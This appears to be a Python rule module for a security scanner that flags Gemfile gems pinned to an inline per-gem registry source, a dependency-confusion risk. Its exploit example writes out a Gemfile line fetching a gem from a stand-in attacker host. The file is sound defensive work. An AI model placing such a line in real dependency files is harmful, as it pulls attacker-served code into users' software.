"""GEM-012. Gemfile gem pinned to a per-gem ``:source``."""
from __future__ import annotations

from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import GemFile

RULE = Rule(
    id="GEM-012",
    title="Gemfile gem pinned to a per-gem :source",
    severity=Severity.MEDIUM,
    owasp=("CICD-SEC-3", "CICD-SEC-5"),
    esf=("ESF-S-TRUSTED-REG", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-829",),
    recommendation=(
        "Confirm each per-gem ``source:`` points at a registry you "
        "trust, and prefer a scoped ``source \"…\" do … end`` block "
        "over the inline option so the gem's origin is obvious at a "
        "glance. A ``gem \"x\", source: \"https://other-registry\"`` "
        "pulls that one gem from a different index than the rest of "
        "the bundle, so a name that also exists on the default "
        "source can be resolved from the attacker's registry "
        "instead (the Bundler face of dependency confusion). Where "
        "a private gem is involved, host it on a single canonical "
        "internal source and route the whole bundle through it "
        "rather than per-gem overrides, which are easy to miss in "
        "review and easy to point at a typosquatted host."
    ),
    docs_note=(
        "Fires on a ``gem`` entry that carries an inline "
        "``source:`` option (``gem \"x\", source: "
        "\"https://…\"``). This is the per-gem analog of GEM-007's "
        "multiple-top-level-``source`` confusion: it splits one "
        "gem's resolution off to a different registry than the "
        "bundle default. Distinct from GEM-003 (a ``source`` over "
        "plain HTTP) and from GEM-005 (a ``git:`` / ``github:`` "
        "source); this rule is about a registry override, not "
        "transport or VCS pinning.\n\n"
        "MEDIUM because a per-gem source is sometimes legitimate "
        "(one private gem on an internal index). The signal is the "
        "split itself: it widens the trusted-source set for a "
        "single name and is easy to overlook."
    ),
    known_fp=(
        "A single private gem hosted on a trusted internal index, "
        "pulled in via a per-gem ``source:`` while the rest of the "
        "bundle uses rubygems.org, is a legitimate pattern. "
        "Suppress per line with a rationale, or move the private "
        "gem behind a scoped ``source \"…\" do … end`` block so the "
        "split is explicit.",
    ),
    exploit_example=(
        "# Vulnerable: one gem resolved from a different registry.\n"
        "source \"https://rubygems.org\"\n"
        "gem \"rails\", \"7.0.4\"\n"
        "gem \"internal-helper\", source: \"https://gems.attacker.test\"\n"
        "\n"
        "# Risk: if ``internal-helper`` (or any name the override\n"
        "# registry can serve) also exists upstream, Bundler may\n"
        "# resolve the attacker's copy. The per-gem override widens\n"
        "# the trusted-source set for that name and is easy to miss\n"
        "# next to the version pins.\n"
        "\n"
        "# Safe: one canonical source, or an explicit scoped block.\n"
        "source \"https://gems.internal.example.com\" do\n"
        "  gem \"internal-helper\"\n"
        "end"
    ),
)


def check(pom: GemFile) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    for dep in pom.dependencies:
        if not dep.per_gem_source:
            continue
        offenders.append(f"{dep.name} (source: {dep.per_gem_source})")
        locations.append(Location(
            path=pom.path,
            start_line=dep.line_no, end_line=dep.line_no,
        ))
    passed = not offenders
    desc = (
        "No gem pins an inline per-gem :source override."
        if passed else
        f"{len(offenders)} gem(s) override the bundle source "
        f"inline: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. Each split widens "
        f"the trusted-source set for one name; confirm the registry "
        f"is trusted or move it behind a scoped source block."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=pom.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
